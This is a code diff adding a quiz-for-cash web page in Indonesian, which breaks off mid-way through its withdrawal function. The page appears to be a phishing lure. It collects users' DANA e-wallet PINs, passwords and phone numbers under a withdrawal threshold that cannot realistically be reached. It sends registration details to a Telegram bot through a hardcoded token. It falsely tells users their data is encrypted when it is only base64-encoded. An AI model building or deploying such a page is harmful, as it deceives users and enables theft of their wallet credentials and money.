@@ -1,0 +1,1333 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>QUIZ CASH PRO - Login & Tarik Dana</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* ===== RESET & BASE ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        html {
+            -webkit-text-size-adjust: 100%;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
+            color: #fff;
+            min-height: 100vh;
+            padding: 15px;
+            overflow-x: hidden;
+        }
+        
+        /* ===== CONTAINER ===== */
+        .container {
+            max-width: 100%;
+            width: 100%;
+            margin: 0 auto;
+            background: rgba(15, 15, 35, 0.95);
+            border-radius: 20px;
+            padding: 20px;
+            border: 3px solid #00fff7;
+            box-shadow: 0 0 30px rgba(0, 255, 247, 0.2);
+            position: relative;
+        }
+        
+        /* ===== HEADER ===== */
+        header {
+            text-align: center;
+            padding-bottom: 20px;
+            margin-bottom: 20px;
+            border-bottom: 3px solid #ff0080;
+        }
+        
+        h1 {
+            color: #00fff7;
+            font-size: 1.8em;
+            text-shadow: 0 0 15px #00fff7;
+            margin-bottom: 10px;
+            word-wrap: break-word;
+        }
+        
+        .tagline {
+            color: #ffcc00;
+            font-size: 0.9em;
+            line-height: 1.4;
+        }
+        
+        /* ===== AUTH FORMS ===== */
+        .auth-section {
+            background: linear-gradient(135deg, rgba(30, 60, 114, 0.9), rgba(42, 82, 152, 0.9));
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            border: 2px solid #ffcc00;
+        }
+        
+        .auth-tabs {
+            display: flex;
+            margin-bottom: 20px;
+            border-radius: 10px;
+            overflow: hidden;
+            background: rgba(0, 0, 0, 0.3);
+        }
+        
+        .auth-tab {
+            flex: 1;
+            padding: 15px;
+            text-align: center;
+            background: transparent;
+            border: none;
+            color: #ccc;
+            font-weight: bold;
+            font-size: 0.95em;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .auth-tab.active {
+            background: #00fff7;
+            color: #000;
+        }
+        
+        .auth-form {
+            display: none;
+        }
+        
+        .auth-form.active {
+            display: block;
+        }
+        
+        /* ===== MAIN CONTENT ===== */
+        .main-content {
+            display: none;
+        }
+        
+        .main-content.active {
+            display: block;
+        }
+        
+        /* ===== USER INFO BAR ===== */
+        .user-info-bar {
+            background: rgba(0, 255, 247, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            border: 2px solid #00fff7;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .user-details {
+            flex: 1;
+            min-width: 200px;
+        }
+        
+        .logout-btn {
+            background: rgba(255, 0, 0, 0.2);
+            color: #ff6666;
+            border: 2px solid #ff6666;
+            padding: 10px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: all 0.3s;
+            font-size: 0.9em;
+        }
+        
+        .logout-btn:hover {
+            background: rgba(255, 0, 0, 0.3);
+        }
+        
+        /* ===== SALDO SECTION ===== */
+        .saldo-section {
+            background: linear-gradient(135deg, #1a2980, #26d0ce);
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            border: 2px solid #ffcc00;
+            text-align: center;
+        }
+        
+        .saldo-display {
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 12px;
+            border: 3px solid #00ff9d;
+            margin: 15px 0;
+        }
+        
+        .saldo-amount {
+            font-size: 2.2em;
+            font-weight: bold;
+            color: #00ff9d;
+            text-shadow: 0 0 20px #00ff9d;
+            margin: 10px 0;
+            word-break: break-word;
+        }
+        
+        /* ===== QUIZ SECTION ===== */
+        .quiz-section {
+            background: rgba(30, 30, 60, 0.9);
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            border: 2px solid #9d00ff;
+        }
+        
+        .quiz-box {
+            background: rgba(0, 0, 30, 0.8);
+            padding: 20px;
+            border-radius: 12px;
+            border: 2px solid #00fff7;
+        }
+        
+        #question {
+            font-size: 1.1em;
+            color: #ffcc00;
+            margin-bottom: 20px;
+            min-height: 50px;
+            line-height: 1.4;
+        }
+        
+        .options-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .option-btn {
+            padding: 14px;
+            border: none;
+            border-radius: 10px;
+            background: linear-gradient(135deg, #2b32b2, #1488cc);
+            color: white;
+            font-size: 0.95em;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 2px solid #00fff7;
+            font-weight: bold;
+            min-height: 50px;
+        }
+        
+        .option-btn:hover, .option-btn:active {
+            transform: translateY(-2px);
+            background: linear-gradient(135deg, #ff0080, #ff8c00);
+            box-shadow: 0 5px 15px rgba(255, 0, 128, 0.3);
+        }
+        
+        /* ===== WITHDRAW SECTION ===== */
+        .withdraw-section {
+            background: linear-gradient(135deg, #11998e, #38ef7d);
+            padding: 20px;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            border: 2px solid #00ff9d;
+        }
+        
+        .input-group {
+            margin-bottom: 15px;
+        }
+        
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            color: #fff;
+            font-weight: bold;
+            font-size: 0.95em;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #ffcc00;
+            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.5);
+            color: white;
+            font-size: 0.95em;
+            transition: all 0.3s;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+        
+        .input-field:focus {
+            outline: none;
+            border-color: #00fff7;
+            box-shadow: 0 0 15px rgba(0, 255, 247, 0.5);
+        }
+        
+        .withdraw-btn {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #ff0080, #ff6600);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 1.1em;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 3px solid #ffcc00;
+            margin-top: 10px;
+        }
+        
+        .withdraw-btn:hover, .withdraw-btn:active {
+            background: linear-gradient(135deg, #ff0000, #ff3300);
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(255, 0, 0, 0.3);
+        }
+        
+        /* ===== ALERT & LOADING ===== */
+        .alert {
+            padding: 14px;
+            border-radius: 10px;
+            margin: 15px 0;
+            font-weight: bold;
+            text-align: center;
+            display: none;
+        }
+        
+        .alert-success {
+            background: rgba(0, 255, 157, 0.2);
+            border: 2px solid #00ff9d;
+            color: #00ff9d;
+        }
+        
+        .alert-error {
+            background: rgba(255, 0, 0, 0.2);
+            border: 2px solid #ff6666;
+            color: #ff6666;
+        }
+        
+        .alert-info {
+            background: rgba(0, 168, 255, 0.2);
+            border: 2px solid #00a8ff;
+            color: #00a8ff;
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 15px;
+            color: #00fff7;
+            display: none;
+        }
+        
+        .loading i {
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* ===== FOOTER ===== */
+        footer {
+            text-align: center;
+            padding-top: 20px;
+            margin-top: 20px;
+            border-top: 2px solid rgba(255, 255, 255, 0.1);
+            color: #aaa;
+            font-size: 0.8em;
+        }
+        
+        .status-active {
+            color: #00ff9d;
+            font-weight: bold;
+        }
+        
+        /* ===== UTILITY ===== */
+        .hidden {
+            display: none !important;
+        }
+        
+        .mt-10 { margin-top: 10px; }
+        .mt-15 { margin-top: 15px; }
+        .mb-10 { margin-bottom: 10px; }
+        .text-center { text-align: center; }
+        .text-small { font-size: 0.85em; }
+        .text-warning { color: #ffcc00; }
+        .text-success { color: #00ff9d; }
+        
+        /* ===== TOUCH FRIENDLY ===== */
+        @media (hover: none) and (pointer: coarse) {
+            .option-btn, .withdraw-btn, .auth-tab, .logout-btn {
+                min-height: 44px;
+                padding: 12px;
+            }
+            
+            .input-field {
+                font-size: 16px;
+            }
+        }
+        
+        /* ===== TABLET & DESKTOP ===== */
+        @media (min-width: 480px) {
+            h1 { font-size: 2.2em; }
+            .tagline { font-size: 1.1em; }
+            .saldo-amount { font-size: 3em; }
+            #question { font-size: 1.3em; }
+            .options-grid { grid-template-columns: 1fr 1fr; }
+            .option-btn { font-size: 1em; }
+            .auth-tab { font-size: 1em; }
+            .logout-btn { font-size: 0.95em; }
+        }
+        
+        @media (min-width: 768px) {
+            .container { max-width: 800px; padding: 25px; }
+            body { padding: 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- HEADER -->
+        <header>
+            <h1><i class="fas fa-money-bill-wave"></i> QUIZ CASH PRO</h1>
+            <p class="tagline">DAFTAR • LOGIN • TARIK DANA DENGAN PIN • WIDRAW</p>
+        </header>
+
+        <!-- ALERT BOX -->
+        <div id="alertBox"></div>
+
+        <!-- AUTH SECTION (TAMPIL SAAT BELUM LOGIN) -->
+        <div class="auth-section" id="authSection">
+            <div class="auth-tabs">
+                <button class="auth-tab active" onclick="showAuthForm('login')">
+                    <i class="fas fa-sign-in-alt"></i> LOGIN
+                </button>
+                <button class="auth-tab" onclick="showAuthForm('register')">
+                    <i class="fas fa-user-plus"></i> DAFTAR BARU
+                </button>
+            </div>
+            
+            <!-- LOGIN FORM -->
+            <form class="auth-form active" id="loginForm" onsubmit="loginUser(event)">
+                <div class="input-group">
+                    <label class="input-label"><i class="fas fa-phone"></i> Nomor HP</label>
+                    <input type="tel" class="input-field" id="loginPhone" 
+                           placeholder="081234567890" required pattern="[0-9]{10,13}">
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label"><i class="fas fa-lock"></i> Password</label>
+                    <input type="password" class="input-field" id="loginPassword" 
+                           placeholder="Masukkan password" required minlength="6">
+                </div>
+                
+                <button type="submit" class="withdraw-btn">
+                    <i class="fas fa-sign-in-alt"></i> MASUK KE AKUN
+                </button>
+                
+                <p class="text-center mt-10 text-warning">
+                    <i class="fas fa-gift"></i> Bonus saldo Rp 10.000 untuk user baru!
+                </p>
+            </form>
+            
+            <!-- REGISTER FORM -->
+            <form class="auth-form" id="registerForm" onsubmit="registerUser(event)">
+                <div class="input-group">
+                    <label class="input-label"><i class="fas fa-user"></i> Nama Lengkap</label>
+                    <input type="text" class="input-field" id="registerName" 
+                           placeholder="Nama lengkap Anda" required>
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label"><i class="fas fa-phone"></i> Nomor HP (untuk DANA)</label>
+                    <input type="tel" class="input-field" id="registerPhone" 
+                           placeholder="081234567890" required pattern="[0-9]{10,13}">
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label"><i class="fab fa-telegram"></i> Username Telegram</label>
+                    <input type="text" class="input-field" id="registerTelegram" 
+                           placeholder="@username (opsional)">
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label"><i class="fas fa-lock"></i> Buat Password</label>
+                    <input type="password" class="input-field" id="registerPassword" 
+                           placeholder="Minimal 6 karakter" required minlength="6">
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label"><i class="fas fa-lock"></i> Konfirmasi Password</label>
+                    <input type="password" class="input-field" id="registerConfirmPassword" 
+                           placeholder="Ulangi password" required minlength="6">
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label"><i class="fas fa-key"></i> PIN DANA (6 digit)</label>
+                    <input type="password" class="input-field" id="registerPinDana" 
+                           placeholder="123456" required pattern="[0-9]{6}" maxlength="6">
+                    <div class="text-small text-warning mt-5">
+                        PIN untuk verifikasi penarikan ke DANA
+                    </div>
+                </div>
+                
+                <button type="submit" class="withdraw-btn" style="background:linear-gradient(135deg, #9d00ff, #cc00ff);">
+                    <i class="fas fa-user-plus"></i> BUAT AKUN BARU
+                </button>
+                
+                <p class="text-center mt-10">
+                    <i class="fas fa-shield-alt"></i> Data Anda aman dan terenkripsi
+                </p>
+            </form>
+        </div>
+
+        <!-- MAIN CONTENT (TAMPIL SETELAH LOGIN) -->
+        <div class="main-content" id="mainContent">
+            <!-- USER INFO BAR -->
+            <div class="user-info-bar">
+                <div class="user-details">
+                    <strong><i class="fas fa-user"></i> <span id="loggedInUser">User</span></strong>
+                    <div class="text-small">
+                        Saldo: Rp <span id="userSaldo">0</span> | 
+                        No. DANA: <span id="userDanaNumber">-</span>
+                    </div>
+                </div>
+                <button class="logout-btn" onclick="logoutUser()">
+                    <i class="fas fa-sign-out-alt"></i> Logout
+                </button>
+            </div>
+
+            <!-- SALDO SECTION -->
+            <div class="saldo-section">
+                <h2 class="input-label"><i class="fas fa-wallet"></i> SALDO ANDA</h2>
+                <div class="saldo-display">
+                    <p>Total Saldo Tersedia</p>
+                    <div class="saldo-amount">Rp <span id="currentSaldo">0</span></div>
+                    <p class="text-warning">Minimal penarikan: <strong>Rp 500.000</strong></p>
+                </div>
+                <p class="text-small text-success">
+                    <i class="fas fa-coins"></i> Jawab quiz untuk tambah saldo!
+                </p>
+            </div>
+
+            <!-- QUIZ SECTION -->
+            <div class="quiz-section">
+                <h2 class="input-label"><i class="fas fa-brain"></i> KUIS HARIAN (+Rp 1.000/benar)</h2>
+                <div class="quiz-box">
+                    <div id="question">Memuat soal...</div>
+                    
+                    <div class="options-grid">
+                        <button class="option-btn" onclick="answerQuestion('A')" id="optionA">A. ...</button>
+                        <button class="option-btn" onclick="answerQuestion('B')" id="optionB">B. ...</button>
+                        <button class="option-btn" onclick="answerQuestion('C')" id="optionC">C. ...</button>
+                        <button class="option-btn" onclick="answerQuestion('D')" id="optionD">D. ...</button>
+                    </div>
+                    
+                    <div class="loading" id="quizLoading">
+                        <i class="fas fa-spinner"></i> Memproses...
+                    </div>
+                    
+                    <div id="quizResult"></div>
+                    
+                    <button class="option-btn mt-15" onclick="loadNewQuestion()" style="background:linear-gradient(135deg, #9d00ff, #cc00ff);">
+                        <i class="fas fa-sync-alt"></i> SOAL BERIKUTNYA
+                    </button>
+                </div>
+            </div>
+
+            <!-- WITHDRAW SECTION -->
+            <div class="withdraw-section">
+                <h2 class="input-label"><i class="fas fa-money-check-alt"></i> TARIK DANA KE DANA</h2>
+                
+                <div class="input-group">
+                    <label class="input-label"><i class="fas fa-phone"></i> Nomor DANA</label>
+                    <input type="text" class="input-field" id="withdrawDanaNumber" 
+                           placeholder="081234567890" required readonly>
+                    <div class="text-small text-warning mt-5">
+                        Nomor DANA Anda (tersimpan di sistem)
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label"><i class="fas fa-key"></i> PIN DANA (6 digit)</label>
+                    <input type="password" class="input-field" id="withdrawPinDana" 
+                           placeholder="Masukkan PIN DANA Anda" required maxlength="6">
+                    <div class="text-small text-warning mt-5">
+                        PIN harus sama dengan saat pendaftaran
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label"><i class="fas fa-coins"></i> Jumlah Penarikan</label>
+                    <input type="number" class="input-field" id="jumlahTarik" 
+                           placeholder="500000" min="500000" max="1500000" step="10000"
+                           value="500000" required>
+                    <div class="text-small text-warning mt-10">
+                        Minimal: Rp 500.000 | Maksimal: Rp 1.500.000
+                    </div>
+                </div>
+                
+                <button class="withdraw-btn" onclick="processWithdrawal()">
+                    <i class="fas fa-paper-plane"></i> TARIK SEKARANG
+                </button>
+                
+                <div class="loading" id="withdrawLoading">
+                    <i class="fas fa-spinner"></i> Verifikasi & Tarik ke dana...
+                </div>
+                
+                <div id="withdrawResult"></div>
+                
+                <p class="text-center mt-15 text-small">
+                    <i class="fas fa-shield-alt"></i>
+                    PIN diverifikasi sebelum tarik ke dana
+                </p>
+            </div>
+
+            <!-- TRANSACTION HISTORY -->
+            <div class="quiz-section" style="border-color:#00a8ff;">
+                <h2 class="input-label"><i class="fas fa-history"></i> RIWAYAT PENARIKAN</h2>
+                <div class="quiz-box" style="border-color:#00a8ff;">
+                    <div id="transactionHistory">
+                        <p class="text-center">Belum ada transaksi</p>
+                    </div>
+                    <button class="option-btn mt-15" onclick="loadTransactionHistory()" style="background:linear-gradient(135deg, #00a8ff, #0077ff);">
+                        <i class="fas fa-sync-alt"></i> REFRESH RIWAYAT
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- FOOTER -->
+        <footer>
+            <p>SISTEM STATUS: <span class="status-active" id="systemStatus">READY</span></p>
+            <p class="mt-10">
+                <i class="fas fa-user-shield"></i> Secure Login | 
+                <i class="fas fa-money-check"></i> Withdraw with PIN | 
+                <i class="fab fa-telegram"></i> Telegram Bot
+            </p>
+        </footer>
+    </div>
+
+    <script>
+        // ====================== KONFIGURASI SISTEM ======================
+        const BOT_TOKEN = "6583157901:AAHqPcD_gVejgC16rSUoj9mSkFq4IZZqYIE"; // Ganti dengan token botmu
+        const CHAT_ID = "6671636477"; // Ganti dengan chat ID admin
+        const MIN_WITHDRAWAL = 500000;
+        const MAX_WITHDRAWAL = 1500000;
+        const QUIZ_REWARD = 1000;
+        const BONUS_SALDO = 10000; // Bonus untuk user baru
+        
+        // ====================== VARIABEL GLOBAL ======================
+        let currentUser = null;
+        let saldo = 0;
+        let currentQuestion = 0;
+        
+        // Database soal
+        const questions = [
+            {
+                question: "Apa ibukota Indonesia?",
+                options: ["Jakarta", "Bandung", "Surabaya", "Medan"],
+                answer: "A"
+            },
+            {
+                question: "2 + 2 × 2 = ?",
+                options: ["6", "8", "4", "10"],
+                answer: "A"
+            },
+            {
+                question: "Planet terdekat dari matahari?",
+                options: ["Venus", "Mars", "Merkurius", "Bumi"],
+                answer: "C"
+            },
+            {
+                question: "Warna bendera Indonesia?",
+                options: ["Merah Putih", "Merah Kuning", "Hijau Putih", "Biru Merah"],
+                answer: "A"
+            },
+            {
+                question: "Presiden pertama Indonesia?",
+                options: ["Soeharto", "Jokowi", "Soekarno", "Megawati"],
+                answer: "C"
+            },
+            {
+                question: "1 dozen berapa buah?",
+                options: ["10", "12", "14", "16"],
+                answer: "B"
+            }
+        ];
+        
+        // ====================== FUNGSI UTILITY ======================
+        
+        // Tampilkan alert
+        function showAlert(message, type = 'info', duration = 4000) {
+            const alertBox = document.getElementById('alertBox');
+            const icon = type === 'success' ? 'check-circle' : 
+                        type === 'error' ? 'exclamation-circle' : 'info-circle';
+            
+            alertBox.innerHTML = `
+                <div class="alert alert-${type}">
+                    <i class="fas fa-${icon}"></i>
+                    ${message}
+                </div>
+            `;
+            alertBox.style.display = 'block';
+            
+            setTimeout(() => {
+                alertBox.style.display = 'none';
+            }, duration);
+            
+            // Scroll ke alert
+            alertBox.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+        
+        // Enkripsi sederhana
+        function simpleEncrypt(text) {
+            return btoa(encodeURIComponent(text));
+        }
+        
+        // Dekripsi sederhana
+        function simpleDecrypt(text) {
+            try {
+                return decodeURIComponent(atob(text));
+            } catch {
+                return text;
+            }
+        }
+        
+        // Toggle form auth
+        function showAuthForm(formType) {
+            document.querySelectorAll('.auth-tab').forEach(tab => {
+                tab.classList.remove('active');
+            });
+            document.querySelectorAll('.auth-form').forEach(form => {
+                form.classList.remove('active');
+            });
+            
+            document.querySelector(`.auth-tab[onclick*="${formType}"]`).classList.add('active');
+            document.getElementById(`${formType}Form`).classList.add('active');
+            
+            // Auto focus ke input pertama
+            setTimeout(() => {
+                const firstInput = document.getElementById(`${formType}Form`).querySelector('input');
+                if (firstInput) firstInput.focus();
+            }, 100);
+        }
+        
+        // Update tampilan user
+        function updateUserDisplay() {
+            if (!currentUser) return;
+            
+            document.getElementById('loggedInUser').textContent = currentUser.name;
+            document.getElementById('userSaldo').textContent = saldo.toLocaleString('id-ID');
+            document.getElementById('userDanaNumber').textContent = currentUser.danaNumber;
+            document.getElementById('currentSaldo').textContent = saldo.toLocaleString('id-ID');
+            document.getElementById('withdrawDanaNumber').value = currentUser.danaNumber;
+        }
+        
+        // ====================== SISTEM AUTHENTIKASI ======================
+        
+        // Daftar user baru
+        function registerUser(event) {
+            event.preventDefault();
+            
+            const name = document.getElementById('registerName').value.trim();
+            const phone = document.getElementById('registerPhone').value.trim();
+            const telegram = document.getElementById('registerTelegram').value.trim();
+            const password = document.getElementById('registerPassword').value;
+            const confirmPassword = document.getElementById('registerConfirmPassword').value;
+            const pinDana = document.getElementById('registerPinDana').value.trim();
+            
+            // Validasi lengkap
+            if (!name || name.length < 3) {
+                showAlert('Nama minimal 3 karakter!', 'error');
+                return;
+            }
+            
+            if (!phone.match(/^08[0-9]{8,11}$/)) {
+                showAlert('Nomor HP harus 10-13 digit dan diawali 08!', 'error');
+                return;
+            }
+            
+            if (password.length < 6) {
+                showAlert('Password minimal 6 karakter!', 'error');
+                return;
+            }
+            
+            if (password !== confirmPassword) {
+                showAlert('Password dan konfirmasi tidak cocok!', 'error');
+                return;
+            }
+            
+            if (!pinDana.match(/^[0-9]{6}$/)) {
+                showAlert('PIN DANA harus 6 digit angka!', 'error');
+                return;
+            }
+            
+            // Load users dari localStorage
+            const users = JSON.parse(localStorage.getItem('quizCashUsers_v2') || '{}');
+            
+            // Cek jika user sudah ada
+            if (users[phone]) {
+                showAlert('Nomor HP sudah terdaftar! Silakan login.', 'error');
+                showAuthForm('login');
+                document.getElementById('loginPhone').value = phone;
+                return;
+            }
+            
+            // Buat user baru
+            const userId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            
+            const newUser = {
+                id: userId,
+                name: name,
+                phone: phone,
+                danaNumber: phone, // Default nomor DANA sama dengan nomor HP
+                telegram: telegram || '',
+                password: simpleEncrypt(password),
+                pinDana: simpleEncrypt(pinDana),
+                saldo: BONUS_SALDO, // Bonus saldo awal
+                createdAt: new Date().toISOString(),
+                lastLogin: new Date().toISOString(),
+                totalWithdrawn: 0,
+                quizAnswered: 0,
+                quizCorrect: 0,
+                transactions: []
+            };
+            
+            // Simpan user
+            users[phone] = newUser;
+            localStorage.setItem('quizCashUsers_v2', JSON.stringify(users));
+            
+            // Auto login
+            loginSuccess(newUser);
+            
+            // Kirim notifikasi ke bot Telegram
+            sendToTelegram(`📋 *USER BARU DAFTAR* 📋\n\n` +
+                         `👤 Nama: ${name}\n` +
+                         `📱 HP/DANA: ${phone}\n` +
+                         `📊 Telegram: ${telegram || 'Tidak ada'}\n` +
+                         `💰 Bonus Saldo: Rp ${BONUS_SALDO.toLocaleString('id-ID')}\n` +
+                         `⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n` +
+                         `🆔 User ID: ${userId}`);
+            
+            showAlert(`🎉 Pendaftaran berhasil! Bonus Rp ${BONUS_SALDO.toLocaleString('id-ID')} telah ditambahkan.`, 'success');
+        }
+        
+        // Login user
+        function loginUser(event) {
+            event.preventDefault();
+            
+            const phone = document.getElementById('loginPhone').value.trim();
+            const password = document.getElementById('loginPassword').value;
+            
+            // Validasi
+            if (!phone.match(/^08[0-9]{8,11}$/)) {
+                showAlert('Format nomor HP tidak valid!', 'error');
+                return;
+            }
+            
+            if (password.length < 6) {
+                showAlert('Password minimal 6 karakter!', 'error');
+                return;
+            }
+            
+            // Cari user
+            const users = JSON.parse(localStorage.getItem('quizCashUsers_v2') || '{}');
+            const user = users[phone];
+            
+            if (!user) {
+                showAlert('User tidak ditemukan! Silakan daftar.', 'error');
+                showAuthForm('register');
+                return;
+            }
+            
+            // Verifikasi password
+            if (simpleEncrypt(password) !== user.password) {
+                showAlert('Password salah!', 'error');
+                return;
+            }
+            
+            // Login berhasil
+            loginSuccess(user);
+            showAlert(`Selamat datang kembali, ${user.name}!`, 'success');
+        }
+        
+        // Proses setelah login sukses
+        function loginSuccess(user) {
+            currentUser = user;
+            saldo = user.saldo || 0;
+            
+            // Update UI
+            document.getElementById('authSection').classList.remove('active');
+            document.getElementById('authSection').style.display = 'none';
+            document.getElementById('mainContent').classList.add('active');
+            
+            // Update user info
+            updateUserDisplay();
+            
+            // Load question
+            loadQuestion();
+            
+            // Update last login
+            user.lastLogin = new Date().toISOString();
+            saveUserData(user);
+            
+            // Save session
+            localStorage.setItem('currentSession_v2', JSON.stringify({
+                userId: user.id,
+                phone: user.phone,
+                timestamp: Date.now()
+            }));
+            
+            // Set status system
+            document.getElementById('systemStatus').textContent = 'LOGGED IN';
+            
+            // Load transaction history
+            loadTransactionHistory();
+            
+            // Auto fill login form untuk next time
+            document.getElementById('loginPhone').value = user.phone;
+        }
+        
+        // Logout user
+        function logoutUser() {
+            if (confirm('Yakin ingin logout?')) {
+                currentUser = null;
+                saldo = 0;
+                
+                document.getElementById('authSection').style.display = 'block';
+                document.getElementById('mainContent').classList.remove('active');
+                
+                // Reset forms
+                document.getElementById('loginPassword').value = '';
+                document.getElementById('withdrawPinDana').value = '';
+                
+                localStorage.removeItem('currentSession_v2');
+                document.getElementById('systemStatus').textContent = 'READY';
+                
+                showAlert('Logout berhasil!', 'info');
+            }
+        }
+        
+        // Simpan data user
+        function saveUserData(user) {
+            const users = JSON.parse(localStorage.getItem('quizCashUsers_v2') || '{}');
+            users[user.phone] = user;
+            localStorage.setItem('quizCashUsers_v2', JSON.stringify(users));
+        }
+        
+        // ====================== SISTEM QUIZ ======================
+        
+        // Load soal
+        function loadQuestion() {
+            if (currentQuestion >= questions.length) {
+                currentQuestion = 0;
+            }
+            
+            const q = questions[currentQuestion];
+            document.getElementById('question').textContent = q.question;
+            document.getElementById('optionA').textContent = `A. ${q.options[0]}`;
+            document.getElementById('optionB').textContent = `B. ${q.options[1]}`;
+            document.getElementById('optionC').textContent = `C. ${q.options[2]}`;
+            document.getElementById('optionD').textContent = `D. ${q.options[3]}`;
+            
+            document.getElementById('quizResult').innerHTML = '';
+        }
+        
+        // Jawab soal
+        function answerQuestion(answer) {
+            if (!currentUser) {
+                showAlert('Silakan login terlebih dahulu!', 'error');
+                return;
+            }
+            
+            const q = questions[currentQuestion];
+            const buttons = document.querySelectorAll('.option-btn');
+            const quizResult = document.getElementById('quizResult');
+            
+            // Disable buttons selama proses
+            buttons.forEach(btn => btn.disabled = true);
+            document.getElementById('quizLoading').style.display = 'block';
+            
+            setTimeout(() => {
+                document.getElementById('quizLoading').style.display = 'none';
+                buttons.forEach(btn => btn.disabled = false);
+                
+                const isCorrect = answer === q.answer;
+                
+                if (isCorrect) {
+                    // Tambah saldo
+                    saldo += QUIZ_REWARD;
+                    currentUser.saldo = saldo;
+                    currentUser.quizAnswered = (currentUser.quizAnswered || 0) + 1;
+                    currentUser.quizCorrect = (currentUser.quizCorrect || 0) + 1;
+                    
+                    // Update tampilan
+                    updateUserDisplay();
+                    saveUserData(currentUser);
+                    
+                    // Tampilkan hasil
+                    quizResult.innerHTML = `
+                        <div class="alert alert-success">
+                            <i class="fas fa-check-circle"></i>
+                            <strong>BENAR!</strong> +Rp ${QUIZ_REWARD.toLocaleString('id-ID')}
+                            <br>
+                            <small>Saldo sekarang: Rp ${saldo.toLocaleString('id-ID')}</small>
+                        </div>
+                    `;
+                    
+                    showAlert(`✅ Jawaban benar! +Rp ${QUIZ_REWARD.toLocaleString('id-ID')}`, 'success', 2000);
+                    
+                } else {
+                    currentUser.quizAnswered = (currentUser.quizAnswered || 0) + 1;
+                    saveUserData(currentUser);
+                    
+                    quizResult.innerHTML = `
+                        <div class="alert alert-error">
+                            <i class="fas fa-times-circle"></i>
+                            <strong>SALAH!</strong> Jawaban: ${q.answer}
+                        </div>
+                    `;
+                }
+                
+                // Auto next question setelah 1.5 detik
+                setTimeout(() => {
+                    loadNewQuestion();
+                }, 1500);
+                
+            }, 800);
+        }
+        
+        // Load soal baru
+        function loadNewQuestion() {
+            currentQuestion = (currentQuestion + 1) % questions.length;
+            loadQuestion();
+        }
+        
+        // ====================== SISTEM PENARIKAN ======================
+        
+        // Proses penarikan dengan verifikasi PIN
+        async function processWithdrawal() {
+            if (!currentUser) {
+                showAlert('Silakan login terlebih dahulu!', 'error');
+                return;
+            }
+            
+            const pinInput = document.getElementById('withdrawPinDana').value.trim();
+            const jumlahTarik = parseInt(document.getElementById('jumlahTarik').value);
+            const danaNumber = currentUser.danaNumber;
+            
+            const resultDiv = document.getElementById('withdrawResult');
+            const loading = document.getElementById('withdrawLoading');
+            
+            // Validasi
+            if (!pinInput.match(/^[0-9]{6}$/)) {
+                showAlert('PIN harus 6 digit angka!', 'error');
+                return;
+            }
+            
+            // Verifikasi PIN
+            if (simpleEncrypt(pinInput) !== currentUser.pinDana) {
+                showAlert('PIN DANA salah!', 'error');
+                return;
+            }
+            
+            if (jumlahTarik < MIN_WITHDRAWAL || jumlahTarik > MAX_WITHDRAWAL) {
+                showAlert(`Jumlah harus Rp ${MIN_WITHDRAWAL.toLocaleString('id-ID')} - Rp ${MAX_WITHDRAWAL.toLocaleString('id-ID')}!`, 'error');
+                return;
+            }
+            
+            if (saldo < jumlahTarik) {
+                showAlert(`Saldo tidak cukup! Butuh Rp ${jumlahTarik.toLocaleString('id-ID')}, saldo Anda Rp ${saldo.toLocaleString('id-ID')}`, 'error');
+                return;
+            }
+            
+            // Show loading
+            loading.style.display = 'block';
+            resultDiv.innerHTML = '';
+            
+            try {
+                // Kurangi saldo
+                const saldoSebelum = saldo;
+                saldo -= jumlahTarik;
+                currentUser.saldo = saldo;
+                currentUser.totalWithdrawn = (currentUser.totalWithdrawn || 0) + jumlahTarik;
+                
+                // Generate ID transaksi
+                const transaksiId = 'TX' + Date.now() + '_' + Math.random().toString(36).substr(2, 6).toUpperCase();
